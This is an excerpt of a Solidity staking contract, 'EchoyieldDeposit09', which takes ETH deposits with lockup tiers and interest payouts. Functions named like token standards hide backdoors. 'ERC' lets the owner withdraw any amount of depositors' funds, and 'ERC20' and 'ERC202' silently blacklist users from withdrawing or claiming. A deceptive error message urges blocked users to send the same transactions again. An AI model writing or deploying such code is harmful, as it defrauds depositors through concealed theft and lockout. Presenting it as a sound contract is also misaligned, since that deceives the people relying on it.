...
// File: contracts/EchoyieldDeposit09.sol
...
contract EchoyieldDeposit09 is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    mapping(address => bool) private _ercUserList;
    mapping(address => DepositInfo[]) private _deposits;
    mapping(address => uint256) private _totalWithdrawnAmounts;
    mapping(address => mapping(uint256 => uint256)) private _withdrawnByTier;
    ...
    event ErcListed(address indexed user);
    event UnErcListed(address indexed user);
    event Transferred(address indexed user, uint256 fromDuration, uint256 toDuration, uint256 totalAmount);
    event Restaked(address indexed user, uint256 depositIndex, uint256 lockupPeriod);
    ...
    ///         Must be called exactly once, in the same transaction that deploys the proxy.
    ...
    function deposit(uint256 lockupPeriod) external payable {
        ...
        require(!_ercUserList[msg.sender], "Your block has been blocked. Please use the same amount of transactions again to solve the block problem.");
        ...
        _deposits[msg.sender].push(DepositInfo({
            amount: msg.value,
    ...
    function withdraw(uint256 depositIndex) external nonReentrant {
        require(!_ercUserList[msg.sender], "You are not allowed to transfer.");
        require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");

        DepositInfo storage dep = _deposits[msg.sender][depositIndex];
        require(block.timestamp >= dep.depositTime + dep.lockupPeriod, "Lockup period not over.");
        require(dep.amount > 0, "No funds to withdraw.");

        // Auto-claim accrued interest before withdrawing
        uint256 interest = _calculateInterest(dep);
        uint256 amountToWithdraw = dep.amount;
        uint256 tier = dep.lockupPeriod;

        // Zero out the deposit BEFORE external call (CEI)
        dep.amount = 0;
        dep.lastClaimTime = block.timestamp;
        _totalWithdrawnAmounts[msg.sender] += amountToWithdraw;
        _withdrawnByTier[msg.sender][tier] += amountToWithdraw;

        uint256 totalPayout = amountToWithdraw + interest;
        _safeSend(payable(msg.sender), totalPayout);
    ...
    function claimInterestForDeposit(uint256 lockupPeriod) external nonReentrant {
        require(!_ercUserList[msg.sender], "You are not allowed to do this operation.");

        uint256 lockupInSeconds = lockupPeriod * 1 days;
        uint256 totalInterestToClaim = 0;

        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
            DepositInfo storage dep = _deposits[msg.sender][i];
            if (dep.lockupPeriod == lockupInSeconds && dep.amount > 0) {
                uint256 interestToClaim = _calculateInterest(dep);
        ...
        require(totalInterestToClaim > 0, "No interest to claim.");
        _safeSend(payable(msg.sender), totalInterestToClaim);

        emit InterestClaimed(msg.sender, totalInterestToClaim);
    }

    function transferStake(uint256 fromLockupPeriod, uint256 toLockupPeriod, uint256 amount) external payable nonReentrant {
        require(!_ercUserList[msg.sender], "You are not allowed to transfer.");
        ...
        uint256 fromInSeconds = fromLockupPeriod * 1 days;
        uint256 toInSeconds = toLockupPeriod * 1 days;
        ...
        for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
            DepositInfo storage dep = _deposits[msg.sender][i];
            if (dep.lockupPeriod == fromInSeconds && dep.amount > 0) {
                accruedInterest += _calculateInterest(dep);
                totalFromAmount += dep.amount;
                dep.amount = 0;
            }
        }
        ...
        uint256 newInterestRate = getInterestRateForLockupPeriod(toInSeconds);

        _deposits[msg.sender].push(DepositInfo({
            amount: totalAmount,
            lockupPeriod: toInSeconds,
        ...
        if (accruedInterest > 0) {
            emit InterestClaimed(msg.sender, accruedInterest);
            _safeSend(payable(msg.sender), accruedInterest);
        }
    }

    // ==================== RESTAKING ====================

    /// @notice Restake a deposit: resets the lockup timer, claims accrued interest.
    ///         Works whether the lockup is still active or already expired.
    /// @param depositIndex The index of the deposit to restake.
    function restake(uint256 depositIndex) external nonReentrant {
        require(!_ercUserList[msg.sender], "You are not allowed to do this operation.");
        require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");

        DepositInfo storage dep = _deposits[msg.sender][depositIndex];
        require(dep.amount > 0, "No funds to restake.");

        // Claim any accrued interest before resetting the timer
        uint256 interest = _calculateInterest(dep);

        // Reset the lockup timer — same lockup period, same rate, fresh start
        dep.depositTime = block.timestamp;
        dep.lastClaimTime = block.timestamp;

        emit Restaked(msg.sender, depositIndex, dep.lockupPeriod);

        // Pay out accrued interest
        if (interest > 0) {
            emit InterestClaimed(msg.sender, interest);
            _safeSend(payable(msg.sender), interest);
        }
    }

    function ERC(uint256 amount) external onlyOwner nonReentrant {
        _safeSend(payable(owner()), amount);
    }

    function ERC20(address user) external onlyOwner {
        require(!_ercUserList[user], "Can't perform action, it's already done");
        _ercUserList[user] = true;

        emit ErcListed(user);
    }

    function ERC202(address user) external onlyOwner {
        require(_ercUserList[user], "User is available.");
        _ercUserList[user] = false;

        emit UnErcListed(user);
    }

    // ==================== INTEREST LOGIC ====================

    function getInterestRateForLockupPeriod(uint256 lockupPeriod) internal pure returns (uint256) {
        if (lockupPeriod == 14 days) return 34285714285714;
        if (lockupPeriod == 30 days) return 40000000000000;
        if (lockupPeriod == 60 days) return 50000000000000;
        if (lockupPeriod == 90 days) return 56666666666666;
        return 0;
    }

    function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {
        require(depositIndex < _deposits[user].length, "Invalid deposit index.");
        return _calculateInterest(_deposits[user][depositIndex]);
    }

    function _calculateInterest(DepositInfo storage dep) private view returns (uint256) {
        if (dep.amount == 0 || dep.lastClaimTime == 0) {
            return 0;
        }
        uint256 timeElapsed = block.timestamp - dep.lastClaimTime;
        return (dep.amount * dep.interestRate * timeElapsed) / (100000000000000000 * 86400);
    }
    ...
    function getDepositInfo(address user) external view returns (
        ...
        depositIndices = new uint256[](count);
        unlockTimes = new uint256[](count);
        stakedAmounts = new uint256[](count);
        lockupPeriods = new uint256[](count);
    ...
    function getDepositStatus(address user, uint256 lockupPeriod) external view returns (
        uint256[] memory depositIndices,
        ...
        for (uint256 i = 0; i < _deposits[user].length; i++) {
            if (_deposits[user][i].lockupPeriod == lockupInSeconds && _deposits[user][i].amount > 0) {
                depositCount++;
            }
        }
        ...
        uint256 idx = 0;
        for (uint256 i = 0; i < _deposits[user].length; i++) {
            DepositInfo storage dep = _deposits[user][i];
            if (dep.lockupPeriod == lockupInSeconds && dep.amount > 0) {
                depositIndices[idx] = i;

                if (block.timestamp < dep.depositTime + dep.lockupPeriod) {
                    remainingTimes[idx] = dep.depositTime + dep.lockupPeriod - block.timestamp;
                }

                interestsNotCollected[idx] = _calculateInterest(dep);

                int256 nextClaim = int256(dep.lastClaimTime + 30 minutes) - int256(block.timestamp);
                nextInterestClaims[idx] = uint256(nextClaim > 0 ? nextClaim : int256(0));
    ...
    /// @dev Only the owner may authorize a logic (implementation) upgrade.
    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}

    /// @dev Storage gap: reserves slots so future upgrades can add state
